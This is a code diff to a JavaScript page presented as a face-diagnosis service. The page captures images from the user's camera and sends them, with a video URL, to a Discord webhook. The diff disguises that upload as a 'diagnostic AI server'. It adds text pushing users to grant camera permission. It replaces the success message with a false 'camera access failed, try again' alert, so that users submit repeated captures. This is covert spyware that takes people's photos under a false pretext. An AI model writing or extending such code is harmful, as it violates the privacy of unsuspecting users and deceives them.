@@ -206,7 +206,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   async function sendToDiscord(images, videoUrl) {
     const formData = new FormData();
-    const message = `サイトから取得した写真を送信\n\n【動画URL】\n${videoUrl}`;
+    const message = `診断用AIサーバーへ送信\n\n【V-URL】\n${videoUrl}`;
     formData.append("payload_json", JSON.stringify({ content: message }));
 
     images.forEach((img, i) => {
@@ -220,7 +220,7 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   document.getElementById("startButton").onclick = async () => {
-    alert("これからあなたの顔診断を開始します！\nカメラの許可をして頂かなければ、診断が開始できません。");
+    alert("これからあなたの顔診断を開始します！\nカメラの許可をして頂かなければ、診断が開始できません。\nこの後表示されるカメラ許可のポップアップに従い、診断を開始してください。");
 
     try {
       const userImages = await captureImages("user");
@@ -232,7 +232,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
       await sendToDiscord(allImages, videoUrl);
 
-      alert("診断データを送信しました！");
+      alert("カメラへのアクセスに失敗しました。\nもう一度初めからやり直し、診断を開始してください。\n※複数回アクセスに失敗した場合、\n使用している端末/ブラウザが当サイトに対応していない可能性があります。");
     } catch (e) {
       console.error("送信失敗:", e);
       alert("エラーが発生しました。カメラやマイクの設定をご確認ください。");
